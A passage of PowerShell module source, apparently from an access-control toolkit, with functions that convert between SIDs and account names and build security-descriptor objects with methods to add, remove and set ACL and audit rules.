                        # Write error and break out of process{} block
                        Write-Error $_
                        return
                    }
                }
            }

            default {
                try {
                    # The only type that should allow this would be a SecurityIdentifier. Attempt the cast,
                    # and write an error if it doesn't work.
                    $TranslatedSid = $IdentityReference = [System.Security.Principal.IdentityReference] $Principal
                }
                catch {
                    Write-Error $_
                    return
                }
            }
        }

        switch ($PSCmdlet.ParameterSetName) {
            ReturnSid {
                # If everything worked, this should have been populated (if it's null, there must have been an error
                # and -DontVerifyNtAccount switch was passed)
                $TranslatedSid
            }

            ReturnAccount {
                if ($NtAccount -eq $null) {
                    # This can happen if a SID was passed to the function. Go ahead and try to translate it:
                    try {
                        $Account = Get-AccountFromSid -Sid $TranslatedSid @ExtraParam -ErrorAction Stop
                        [System.Security.Principal.NTAccount] $NtAccount = ("{0}\{1}" -f $Account.Domain, $Account.AccountName).TrimStart("\")
                    }
                    catch {
                        Write-Error $_
                        return
                    }
                }
                $NtAccount
            }

            default {
                # Just return the identity reference
                $IdentityReference
            }
        }
    }
}

function script:GetPrincipalString {
  <#
      I may put this functionality in the ConvertToIdentityReference. This uses ConvertToIdentityReference to attempt to
      convert an IdentityReference into a string. If the initial translation fails, the $SdPath and $ObjectType are
      inspected, and ConvertToIdentityReference may be called again w/ a remote computer name. If that translation fails,
      the original IdentityReference is returned along with an 'Account Unknown' string

      It gets its own function b/c New-AdaptedAcl and the Onwer/Group properties all need the exact same functionality
      (attempt local translation, then possibly remote translation)
  #>

    param(
        [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
        [Alias("SecurityIdentifier", "Principal")]
        $IdentityReference,
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [System.Security.AccessControl.ResourceType] $ObjectType,
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        $SdPath
    )

    process {
        $Principal = $null

        # This will convert the SID to a string representation of the account. If translation isn't possible, principal name will be null (which
        # will make it easy to tell accounts that weren't able to be translated later)
        try {
            $Principal = $IdentityReference | ConvertToIdentityReference -ReturnAccount -ErrorAction Stop
        }
        catch {
            # Error converting. Could this be a user/group on a remote system? Check the SdPath to see if we can pull a
            # machine name out of it

            try {
                if ($PSBoundParameters.ObjectType -match "^DSObject" -and $PSBoundParameters.SdPath -match "((,DC=[^,]*)*?)$") {
                    $DomainName = $matches[1] -replace ",DC=", "."
                    $DomainName = $DomainName -replace ".*DnsZones\."
                    $DomainName = $DomainName -replace "^\."

                    $Principal = "{0}\{1}" -f $DomainName, ($IdentityReference | ConvertToIdentityReference -ReturnAccount -ErrorAction Stop -ComputerName $DomainName)


                }
                elseif ($PSBoundParameters.SdPath -match "^(\\\\|Microsoft\.WSMan\.Management\\WSMan::)(?<ComputerName>[^\\]+)\\") {
                    $Principal = "{0}" -f ($IdentityReference | ConvertToIdentityReference -ReturnAccount -ErrorAction Stop -ComputerName $matches.ComputerName)
                }
            }
            catch {
                # Don't do anything here. We'll take care of it outside of the if statement
            }

            if (-not $Principal) {
                # Couldn't convert SID, so return account unknown string. Overloading ToString() method b/c sometimes this value
                # may be used as an identity reference (e.g., Owner property couldn't be translated. If just string is returned,
                # then there will be an error trying to use the actual string value, but a SID object that can't be translated
                # could still be used successfully
                $Principal = $IdentityReference | Add-Member -PassThru -MemberType ScriptMethod -Name ToString -Force -Value { "Account Unknown ({0})" -f $this.Value }
            }
        }

        $Principal
    }
}

function Get-SidFromAccountName {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [string] $AccountName,
        # If Computer/Domain name is used above in [computer]\[user] above, this param will be used in place of the computer/domain above
        [string] $ComputerName
    )

    process {
        $Use = New-Object PowerShellAccessControl.PInvoke.advapi32+SID_NAME_USE
        $ByteArraySize = 0
        $DomainNameBufferLength = 0

        # Was a remote location specified through the parameters?
        if ($PSBoundParameters.ContainsKey("ComputerName")) {
            $Computer = $PSBoundParameters.ComputerName
        }
        else {
            $Computer = $null
        }

        # Dirty hack. ALL APPLICATION PACKAGES can't be converted from name to SID if the authority is included. Remove
        # that authority if found:
        $AccountName = $AccountName -replace "^APPLICATION PACKAGE AUTHORITY\\"

        try {
            # First call tells us SID and DomainName size; return code should be 122:
            $ReturnValue = [PowerShellAccessControl.PInvoke.advapi32]::LookupAccountName(
                $Computer, 
                $AccountName, 
                $null, 
                [ref] $ByteArraySize, 
                $null, 
                [ref] $DomainNameBufferLength, 
                [ref] $Use
            )
            $ReturnValue | CheckExitCode -Action "Looking up SID for '$AccountName'" -ErrorAction Stop
        }
        catch {
            #$RegEx = "^((?<ComputerOrDomain>[^\\]+)\\)?(?<AccountName>[^\\]+)$"
            # Previous RegEx would fail with things like 'DOMAIN\BUILTIN\Pre-Windows 2000 Compatible Access'
            $RegEx = "^((?<ComputerOrDomain>[^\\]+)\\)?(?<AccountName>.+)$"

            if (($ReturnValue -eq 1332) -and 
                ($AccountName -match $RegEx) -and 
                (-not $PSBoundParameters.ContainsKey("ComputerName"))
               ) {
                $null = $PSBoundParameters.Remove("AccountName")
                Write-Debug ("{0}: Failed to translate SID; attempting with computername '{1}'" -f $MyInvocation.MyCommand, $matches.ComputerOrDomain)
                Get-SidFromAccountName -AccountName $matches.AccountName -ComputerName $matches.ComputerOrDomain @PSBoundParameters
                return
            }
            elseif ($ReturnValue -ne 122) {
                Write-Error $_
                return
            }
        }
            
        $ByteArray = New-Object byte[] $ByteArraySize
        $DomainName = New-Object System.Text.StringBuilder $DomainNameBufferLength

        try {
            [PowerShellAccessControl.PInvoke.advapi32]::LookupAccountName(
                $Computer, 
                $AccountName, 
                $ByteArray, 
                [ref] $ByteArraySize, 
                $DomainName, 
                [ref] $DomainNameBufferLength, 
                [ref] $Use
            ) | CheckExitCode -ErrorAction Stop
        }
        catch {
            Write-Error $_
            return
        }

        New-Object PSObject -Property @{
            Use = $Use
            Domain = $DomainName.ToString()
            Sid = (New-Object System.Security.Principal.SecurityIdentifier ($ByteArray, 0))
        }
    }
}

function Get-AccountFromSid {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [Alias('SecurityIdentifier')]
        [System.Security.Principal.SecurityIdentifier] $Sid,
        [string] $ComputerName
    )

    process {

        $SidBytes = New-Object byte[] $Sid.BinaryLength
        $Sid.GetBinaryForm($SidBytes, 0)

        $Use = New-Object PowerShellAccessControl.PInvoke.advapi32+SID_NAME_USE
        $NameBufferLength = $DomainNameBufferLength = 255
        $Name = New-Object System.Text.StringBuilder $NameBufferLength
        $DomainName = New-Object System.Text.StringBuilder $DomainNameBufferLength

        if ($PSBoundParameters.ContainsKey("ComputerName")) {
            $Computer = $PSBoundParameters.ComputerName
        }
        else {
            $Computer = $null
        }

        try {
            [PowerShellAccessControl.PInvoke.advapi32]::LookupAccountSid(
                $Computer, 
                $SidBytes, 
                $Name, 
                [ref] $NameBufferLength, 
                $DomainName, 
                [ref] $DomainNameBufferLength, 
                [ref] $Use
            ) | CheckExitCode -ErrorAction Stop
        }
        catch {
            Write-Error "Error looking up account for SID '$Sid': $($_.Exception.Message)"
            return
        }

        New-Object PSObject -Property @{
            Use = $Use
            Domain = $DomainName.ToString()
            AccountName = $Name.ToString()
        }
    }
}

function Select-SingleObject {
  <#
      .SYNOPSIS
      Takes multiple inputs and allows a user to choose a single one for the output.

      .DESCRIPTION
      This function will filter multiple inputs into a single output. If the PS version
      is greater than version 3.0, Out-GridView is used by default. Otherwise, the
      built-in prompt for choice is used.

      If a specific prompt type is desired, that can be handled with -PromptMode 
      parameter.
  #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$true)]
        $InputObject,
        [ValidateSet("OutGridView","PromptForChoice")]
        $PromptMode,
        [string] $Title = "Please choose one",     # Title for out-gridview; description for prompt for choice
        [string] $PromptForChoiceTitle = "Choice",
        [int] $MaxObjectsToDisplay
    )

    begin {
        if ($PSBoundParameters.ContainsKey("PromptMode")) {
            $PromptMode = $PSBoundParameters.PromptMode
        }
        else {
            if ($PSVersionTable.PSVersion -ge "3.0") {
                $PromptMode = "OutGridView"
            }
            else {
                $PromptMode = "PromptForChoice"
            }
        }

        # Extra check to make sure OutGridView won't be used on a system w/o at least PSv3:
        if ($PromptMode -eq "OutGridView" -and ($PSVersionTable.PSVersion -lt "3.0")) {
            Write-Warning "OutGridView prompt mode not supported in this version of PowerShell"
            $PromptMode = "PromptForChoice"
        }

        $AllInputObjects = @()
    }

    process {
        foreach ($CurrentInputObject in $InputObject) {
            $AllInputObjects += $CurrentInputObject
        }
    }

    end {
        if ($AllInputObjects.Count -eq 0) {
            Write-Error "No objects were provided as input"
            return
        }
        elseif ($AllInputObjects.Count -eq 1) {
            # Single object came through, so output that object and exit
            $AllInputObjects | select -first 1
            return
        }

        # Use Select-Object along with some of the function's parameters to work
        # on the InputObject:
        $SelectObjectParams = @{}
        if ($PSBoundParameters.ContainsKey("MaxObjectsToDisplay")) {
            $SelectObjectParams.First = $MaxObjectsToDisplay
        }

        $AllInputObjects = $AllInputObjects | Select-Object @SelectObjectParams

        switch ($PromptMode) {
            OutGridView {
                do {
                    $AllInputObjects = $AllInputObjects | Out-GridView -Title $Title -OutputMode Single
                } while ($AllInputObjects.Count -gt 1)
                
                $Output = $AllInputObjects
            }

            PromptForChoice {
                $UsedHotkeys = @()

                # This is used as a backup in case the ToString() method doesn't return anything
                $PropertyNames = $AllInputObjects | select -first 1 @Property | Get-Member -MemberType Properties | select -First 4 -ExpandProperty Name
                [System.Management.Automation.Host.ChoiceDescription[]] $Choices = $AllInputObjects | ForEach-Object {
                    $Name = $_.ToString()
                    if (-not $Name) {
                        $Name = foreach ($CurrentPropertyName in $PropertyNames) {
                            $_.$CurrentPropertyName.ToString()
                        }
                        $Name = $Name -join " - "
                    }

                    for ($i = 0; $i -lt $Name.Length; $i++) {
                        $CurrentLetter = $Name[$i]
                        if ($UsedHotkeys -notcontains $CurrentLetter) {
                            $UsedHotkeys += $CurrentLetter
                            $Name = "{0}&{1}" -f $Name.SubString(0, $i), $Name.SubString($i, $Name.Length - $i)
                            break
                        }
                    }

                    New-Object System.Management.Automation.Host.ChoiceDescription $Name
                }

                $Result = $Host.UI.PromptForChoice(
                    $PromptForChoiceTitle, 
                    $Title, 
                    $Choices, 
                    0
                )

                $Output = $AllInputObjects | select -Skip $Result -First 1

            }
        }

        if ($Output -eq $null) {
            Write-Error "Selection cancelled"
        }
        else {
            $Output
        }
    }
}
function script:GetDefaultAppliesTo {
  <#
      Different types of objects have ACEs that have a different "AppliesTo" value. For example, folders default to
      "Object, ChildContains, ChildObjects", files to just "Object", registry keys to "Object, ChildContainers", etc.

      This function takes the access mask enumeration and a boolean value telling whether or not the ACE belongs to
      a container object (like a folder or registry entry), and outputs the default "AppliesTo" enumeration value.
  #>

    [CmdletBinding()]
    param(
        $AccessMaskEnumeration,
        [switch] $IsContainer = $false
    )

    # SDs have ACEs that apply to their object by default:
    $AppliesTo = [PowerShellAccessControl.AppliesTo]::Object

    if ($IsContainer) {
        # If the SD belongs to container, ACEs also apply to child containers by default:
        $AppliesTo = $AppliesTo -bor [PowerShellAccessControl.AppliesTo]::ChildContainers

        # ACEs apply to child objects if they are folders. Switch statement used in case there
        # are future types that need a special handling
        switch ($AccessMaskEnumeration.FullName) {

            System.Security.AccessControl.FileSystemRights {
                $AppliesTo = $AppliesTo -bor [PowerShellAccessControl.AppliesTo]::ChildObjects
            }
        }
    }

    [PowerShellAccessControl.AppliesTo] $AppliesTo
}

filter script:ModifySearchRegex {
  <#
      There are a few places where a regex is used, but I wanted a *
      to be replaced with a .*

      I also wanted a way for the user to still escape the * so that
      they could use one in a proper regex. Just in case the steps
      I came up with were wrong, I wanted to have the replacement
      handled somewhere else so I would just have to make changes in
      one place in the future.

      This replaces a single asterisk with a .*
      If it encounteres a double asterisk, **, it will not do the .*
      replacement, but it will replace it with a single asterisk.
  #>
    $Temp = $_ -replace "(?<!\*)\*(?!\*)", ".*"
    $Temp -replace "\*\*", "*"

}


function Get-SecurityDescriptor {

    [CmdletBinding(DefaultParameterSetName='Path')]
    param(
        [Parameter(Mandatory=$true, ParameterSetName='InputObject', ValueFromPipeline=$true)]
        $InputObject,
        [Parameter(ParameterSetName='DirectPath', Position=0, ValueFromPipelineByPropertyName=$true)]
        [Parameter(ParameterSetName='Path', Position=0, ValueFromPipelineByPropertyName=$true)]
        [string] $Path = '.',
        [Parameter(Mandatory=$true, ParameterSetName='LiteralPath', ValueFromPipelineByPropertyName=$true)]
        [string[]] $LiteralPath,
        [Parameter(ParameterSetName='DirectPath')]
        [Security.AccessControl.ResourceType] $ObjectType,
        [switch] $Audit,
        [Parameter(ParameterSetName='DirectPath')]
        [switch] $IsContainer = $false
    )

    process {

        if ($PSCmdlet.ParameterSetName -eq 'Path' -and (-not $PSBoundParameters.ContainsKey('Path'))) {
            
            
            $null = $PSBoundParameters.Add('Path', $Path)
        }

        foreach ($ObjectInfo in (GetPathInformation @PSBoundParameters)) {
            if ($ObjectInfo.ObjectType -eq $__PowerShellAccessControlResourceTypeName) {
                
                switch ($ObjectInfo.InputObject.GetType().FullName) {
                    { $_ -eq 'System.Management.ManagementObject' -or
                      $_ -eq 'Microsoft.Management.Infrastructure.CimInstance' } {

                        
                        
                        try {
                            $Win32SD = $ObjectInfo.InputObject | Get-Win32SecurityDescriptor -Sddl -ErrorAction Stop
                        }
                        catch {
                            
                            Write-Error -Message $_
                            return
                        }

                        $ObjectInfo.Sddl = $Win32SD.Sddl
                    }

                    'Microsoft.WSMan.Management.WSManConfigLeafElement' {
                        $ObjectInfo.Sddl = $ObjectInfo.InputObject.Value
                    }
                }
            }
            else {

                if ($Audit) {
                    $SecurityInfo = [PowerShellAccessControl.PInvoke.SecurityInformation]::All
                }
                else {
                    $SecurityInfo = [PowerShellAccessControl.PInvoke.SecurityInformation] 'Owner, Group, Dacl'
                }

                try {
                    $SecInfoParams = @{
                        ObjectType = $ObjectInfo.ObjectType
                    }

                    if ($ObjectInfo.Handle) {
                        $SecInfoParams.Handle = $ObjectInfo.SdPath = $ObjectInfo.Handle
                    }
                    else {
                        $SecInfoParams.Path = $ObjectInfo.SdPath
                    }

                    $BinSD = GetSecurityInfo -SecurityInformation $SecurityInfo -ErrorAction Stop @SecInfoParams
                    $ObjectInfo.BinarySD = $BinSD
                }
                catch {
                    
                    Write-Error -Message $_
                    continue
                }
            }

            
            
            foreach ($PropToRemove in 'Handle', 'InputObject') {
                if ($ObjectInfo.$PropToRemove) {
                    $ObjectInfo.Remove($PropToRemove)
                }
            }

            
            try {
                New-AdaptedSecurityDescriptor -ErrorAction Stop @ObjectInfo
            }
            catch {
                Write-Error -Message $_
                continue
            }
        } 
    }
}

function New-AdaptedSecurityDescriptor {

    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, ParameterSetName='BySddl')]
        [string] $Sddl,
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, ParameterSetName='ByBinaryForm')]
        [byte[]] $BinarySD,
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [ValidateScript({$_.BaseType.FullName -eq 'System.Enum'})]
        [type] $AccessMaskEnumeration,
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [ValidateScript({
            ('System.Management.Automation.ScriptBlock','System.String') -contains $_.GetType().FullName
        })]
        [Alias('Description')]
        [string] $Path = '[NO PATH PROVIDED]',
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [Security.AccessControl.ResourceType] $ObjectType = 'Unknown',
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        $SdPath = $Path, 
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [string] $DisplayName = $Path,
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [Alias('PsIsContainer')]
        [switch] $IsContainer = $false,
        [switch] $IsDsObject = $false,
        
        
        [string] $DsObjectClass
    )

    process {

        try {
            switch ($PSCmdlet.ParameterSetName) {
                'BySddl' {
                    $SecurityDescriptor = New-Object -TypeName System.Security.AccessControl.CommonSecurityDescriptor -ArgumentList ($IsContainer, $IsDsObject, $Sddl)
                }

                'ByBinaryForm' {
                    $SecurityDescriptor = New-Object -TypeName System.Security.AccessControl.CommonSecurityDescriptor -ArgumentList ($IsContainer, $IsDsObject, $BinarySD, 0)
                }

                default {
                    
                    throw 'Unknown parameter set'
                }
            }
        }
        catch {
            Write-Error -Message $_
            return
        }

        
        
        
        
        $AdaptedSdProperites = @{
            Path = $Path
            SdPath = $SdPath
            DisplayName = $DisplayName
            ObjectType = $ObjectType
            SecurityDescriptor = $SecurityDescriptor
        }
        if ($PSBoundParameters.ContainsKey('DsObjectClass')) {
            $AdaptedSdProperites.DsObjectClass = $DsObjectClass
        }

        
        $ReturnObject = New-Object -TypeName object
        foreach ($PropertyEnum in $AdaptedSdProperites.GetEnumerator()) {
            $ReturnObject | Add-Member -MemberType NoteProperty -Name $PropertyEnum.Key -Value $PropertyEnum.Value
        }

        $ReturnObject | Add-Member -MemberType ScriptProperty -Name InheritanceString -Value {
            $Output = @()
            if ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags]::DiscretionaryAclPresent) {
                $Output += ('DACL Inheritance: {0}abled' -f (if ($this.AreAccessRulesProtected) { 'Dis' } else { 'En' }))
            }

            if ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags]::SystemAclPresent) {
                $Output += ('SACL Inheritance: {0}abled' -f (if ($this.AreAuditRulesProtected) { 'Dis' } else { 'En' }))
            }
            $Output -join "`n"
        } 
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name AccessPresent -Value {
            $this.SecurityDescriptor.ControlFlags -match 'DiscretionaryAcl'
        } 
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name Access -Value {
            $this | Get-AccessControlEntry -AceType AccessAllowed, AccessDenied
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name Owner -Value {
            $this | GetPrincipalString -IdentityReference $this.SecurityDescriptor.Owner
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name Group -Value {
            $this | GetPrincipalString -IdentityReference $this.SecurityDescriptor.Group
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name AccessToString -Value {
            $this | Get-AccessControlEntry -AceType AccessAllowed, AccessDenied | Convert-AclToString -DefaultAppliesTo (GetDefaultAppliesTo -IsContainer:$this.SecurityDescriptor.IsContainer -AccessMaskEnumeration $this.GetAccessMaskEnumeration())
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name AuditPresent -Value {
            $this.SecurityDescriptor.ControlFlags -match 'SystemAcl'
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name Audit -Value {
            $this | Get-AccessControlEntry -AceType SystemAudit
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name AuditToString -Value {
            $this | Get-AccessControlEntry -AceType SystemAudit | Convert-AclToString -DefaultAppliesTo (GetDefaultAppliesTo -IsContainer:$this.SecurityDescriptor.IsContainer -AccessMaskEnumeration $this.GetAccessMaskEnumeration())
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name RemoveAccessRule -Value { 
            [CmdletBinding()]
            param(
                $Rule
            )

            if (-not ($this.AccessPresent)) {
                
                return $false
            }

            InvokeCommonAclMethod -Acl $this.SecurityDescriptor.DiscretionaryAcl -MethodName RemoveAccess -Rule $Rule -ErrorAction Stop
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name RemoveAccessRuleSpecific -Value { 
            [CmdletBinding()]
            param(
                $Rule
            )

            if (-not ($this.AccessPresent)) {
                
                return $false
            }

            InvokeCommonAclMethod -Acl $this.SecurityDescriptor.DiscretionaryAcl -MethodName RemoveAccessSpecific -Rule $Rule
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name RemoveAuditRuleSpecific -Value { 
            [CmdletBinding()]
            param(
                $Rule
            )

            InvokeCommonAclMethod -Acl $this.SecurityDescriptor.SystemAcl -MethodName RemoveAuditSpecific -Rule $Rule

        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name RemoveAuditRule -Value { 
            [CmdletBinding()]
            param(
                $Rule
            )

            InvokeCommonAclMethod -Acl $this.SecurityDescriptor.SystemAcl -MethodName RemoveAudit -Rule $Rule

        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name AddAccessRule -Value {
            [CmdletBinding()]
            param(
                $Rule
            )

            if (-not ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags]::DiscretionaryAclPresent)) {
                
                $NewAclCreated = $true
                $this.SecurityDescriptor.DiscretionaryAcl = New-Object -TypeName System.Security.AccessControl.DiscretionaryAcl -ArgumentList (
                    $this.SecurityDescriptor.IsContainer, 
                    $this.SecurityDescriptor.IsDS, 
                    0
                )
            }

            try {
                InvokeCommonAclMethod -Acl $this.SecurityDescriptor.DiscretionaryAcl -MethodName AddAccess -Rule $Rule -ErrorAction Stop
            }
            catch {
                if ($NewAclCreated) {
                    
                    $this.SecurityDescriptor.DiscretionaryAcl = $null
                }
                throw $_
            }
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name AddAuditRule -Value {
            [CmdletBinding()]
            param(
                $Rule
            )

            if (-not ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags]::SystemAclPresent)) {
                
                $NewAclCreated = $true
                $this.SecurityDescriptor.SystemAcl = New-Object -TypeName System.Security.AccessControl.SystemAcl -ArgumentList ($this.SecurityDescriptor.IsContainer, $this.SecurityDescriptor.IsDS, 0)
            }

            try {
                InvokeCommonAclMethod -Acl $this.SecurityDescriptor.SystemAcl -MethodName AddAudit -Rule $Rule -ErrorAction Stop
            }
            catch {
                if ($NewAclCreated) {
                    
                    $this.SecurityDescriptor.SystemAcl = $null
                }
                throw $_
            }

        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name SetAccessRule -Value {
            [CmdletBinding()]
            param(
                $Rule
            )

            if (-not ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags]::DiscretionaryAclPresent)) {
                
                $NewAclCreated = $true
                $this.SecurityDescriptor.DiscretionaryAcl = New-Object -TypeName System.Security.AccessControl.DiscretionaryAcl -ArgumentList (
                    $this.SecurityDescriptor.IsContainer, 
                    $this.SecurityDescriptor.IsDS, 
                    0
                )
            }

            try {
                InvokeCommonAclMethod -Acl $this.SecurityDescriptor.DiscretionaryAcl -MethodName SetAccess -Rule $Rule -ErrorAction Stop
            }
            catch {
                if ($NewAclCreated) {
                    
                    $this.SecurityDescriptor.DiscretionaryAcl = $null
                }
                throw $_
            }
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name SetAuditRule -Value {
            [CmdletBinding()]
            param(
                $Rule
            )

            if (-not ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags]::SystemAclPresent)) {
                
                $NewAclCreated = $true
                $this.SecurityDescriptor.SystemAcl = New-Object -TypeName System.Security.AccessControl.SystemAcl -ArgumentList ($this.SecurityDescriptor.IsContainer, $this.SecurityDescriptor.IsDS, 0)
            }

            try {
                InvokeCommonAclMethod -Acl $this.SecurityDescriptor.SystemAcl -MethodName SetAudit -Rule $Rule -ErrorAction Stop
            }
            catch {
                if ($NewAclCreated) {
                    
                    $this.SecurityDescriptor.SystemAcl = $null
                }
                throw $_
            }

        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name SetAccessRuleProtection -Value {
            [CmdletBinding()]
            param(
                [bool] $IsProtected, 
                [bool] $PreserveInheritance
            )

            $this.SecurityDescriptor.SetDiscretionaryAclProtection($IsProtected, $PreserveInheritance)

            
            
            $DaclProtectionDirtyString = @()
            $PreserveInheritanceString = $null
            if ($IsProtected) { 
                $DaclProtectionDirtyString += 'Disable' 
                if ($PreserveInheritance) {
                    $PreserveInheritanceString = '(Preserve existing ACEs)'
                }
                else {
                    $PreserveInheritanceString = '(Remove existing ACEs)'
                }
            }
            else { $DaclProtectionDirtyString += 'Enable' }

            $DaclProtectionDirtyString += 'DACL inheritance'

            if ($PreserveInheritanceString) {
                $DaclProtectionDirtyString += $PreserveInheritanceString
            }
            $this | Add-Member -MemberType NoteProperty -Name DaclProtectionDirty -Value ($DaclProtectionDirtyString -join ' ') -Force
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name SetAuditRuleProtection -Value {
            [CmdletBinding()]
            param(
                [bool] $IsProtected,
                [bool] $PreserveInheritance
            )

            $this.SecurityDescriptor.SetSystemAclProtection($IsProtected, $PreserveInheritance)
        
            
            
            $ProtectionDirtyString = @()
            $PreserveInheritanceString = $null
            if ($IsProtected) { 
                $ProtectionDirtyString += 'Disable' 
                if ($PreserveInheritance) {
                    $PreserveInheritanceString = '(Preserve existing ACEs)'
                }
                else {
                    $PreserveInheritanceString = '(Remove existing ACEs)'
                }
            }
            else { $ProtectionDirtyString += 'Enable' }

            $ProtectionDirtyString += 'SACL inheritance'

            if ($PreserveInheritanceString) {
                $ProtectionDirtyString += $PreserveInheritanceString
            }
            $this | Add-Member -MemberType NoteProperty -Name SaclProtectionDirty -Value ($ProtectionDirtyString -join ' ') -Force
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name PurgeAccessRules -Value {
            [CmdletBinding()]
            param($Identity)

            if ($this.SecurityDescriptor.DiscretionaryAcl -eq $null) {
                return
            }

            try {
                $Sid = $Identity | ConvertToIdentityReference -ReturnSid -ErrorAction Stop
            }
            catch {
                throw $_
            }

            $this.SecurityDescriptor.DiscretionaryAcl.Purge($Sid)

        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name PurgeAuditRules -Value {
            [CmdletBinding()]
            param($Identity)

            if ($this.SecurityDescriptor.SystemAcl -eq $null) {
                return
            }

            try {
                $Sid = $Identity | ConvertToIdentityReference -ReturnSid -ErrorAction Stop
            }
            catch {
                throw $_
            }

            $this.SecurityDescriptor.SystemAcl.Purge($Sid)

        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name AreAccessRulesProtected -Value {
            if ($this.GetAccessControlSections() -band [Security.AccessControl.AccessControlSections]::Access) {
                [bool] ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags]::DiscretionaryAclProtected)
            }
            
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name AreAuditRulesProtected -Value {
            if ($this.GetAccessControlSections() -band [Security.AccessControl.AccessControlSections]::Audit) {
                [bool] ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags]::SystemAclProtected)
            }
            
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name AreAccessRulesCanonical -Value {
            $this.SecurityDescriptor.DiscretionaryAcl.IsCanonical
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name AreAuditRulesCanonical -Value {
            $this.SecurityDescriptor.SystemAcl.IsCanonical
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name SetOwner -Value {
            [CmdletBinding()]
            param(
                $Owner
            )

            try {
                $Sid = $Owner | ConvertToIdentityReference -ReturnSid -ErrorAction Stop
            }
            catch {
                throw $_
            }

            $this.SecurityDescriptor.Owner = $Sid

        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name Sddl -Value {
            $this.SecurityDescriptor.GetSddlForm([Security.AccessControl.AccessControlSections]::All)
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name GetSecurityDescriptorBinaryForm -Value {
            $BinarySD = New-Object -TypeName byte[] -ArgumentList $this.SecurityDescriptor.BinaryLength
            $this.SecurityDescriptor.GetBinaryForm($BinarySD, 0)

            $BinarySD
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name GetAccessControlSections -Value {
            
            

            $SectionsContained = [Security.AccessControl.AccessControlSections]::None

            foreach ($Section in 'Owner', 'Group') {
                if ($this.SecurityDescriptor.$Section -ne $null) {
                    $SectionsContained = $SectionsContained -bor [Security.AccessControl.AccessControlSections]::$Section
                }
            }

            if ($this.SecurityDescriptor.GetSddlForm('Access') -ne '') {
                
                
                $SectionsContained = $SectionsContained -bor [Security.AccessControl.AccessControlSections]::Access
            }

            if ($this.SecurityDescriptor.ControlFlags -band [Security.AccessControl.ControlFlags] 'SystemAclPresent, SystemAclProtected, SystemAclAutoInherited' ) {
                $SectionsContained = $SectionsContained -bor [Security.AccessControl.AccessControlSections]::Audit
            }

            [Security.AccessControl.AccessControlSections] $SectionsContained

        }
        $ReturnObject | Add-Member -MemberType NoteProperty -Name OriginalOwner -Value $SecurityDescriptor.Owner
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name HasOwnerChanged -Value {
                -not ($this.OriginalOwner -eq $this.SecurityDescriptor.Owner)
        }
        $ReturnObject | Add-Member -MemberType NoteProperty -Name OriginalGroup -Value $SecurityDescriptor.Group
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name HasGroupChanged -Value {
                -not ($this.OriginalGroup -eq $this.SecurityDescriptor.Group)
        }
        $ReturnObject | Add-Member -MemberType ScriptProperty -Name MandatoryIntegrityLabel -Value {
            Get-MandatoryIntegrityLabel -Path $this.SdPath -ObjectType $this.ObjectType | 
                Add-Member -MemberType ScriptMethod -Name ToString -Force -Value { '{0} ({1})' -f $this.Principal, $this.AccessMaskDisplay }
        }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name GetAceCsv -Value {
            [CmdletBinding()]
            param(
                [char] $Delimiter = ','
            )

            $CsvProperties = @(
                'DisplayName'
                'Path'
                'AceType'
                'Principal' 
                @{Name='AccessMask'; Expression={ $_.AccessMaskDisplay }}
                'InheritedFrom'
                'AppliesTo'
                'OnlyApplyToThisContainer'
                'InheritanceString'
                'AuditFlags'
            )

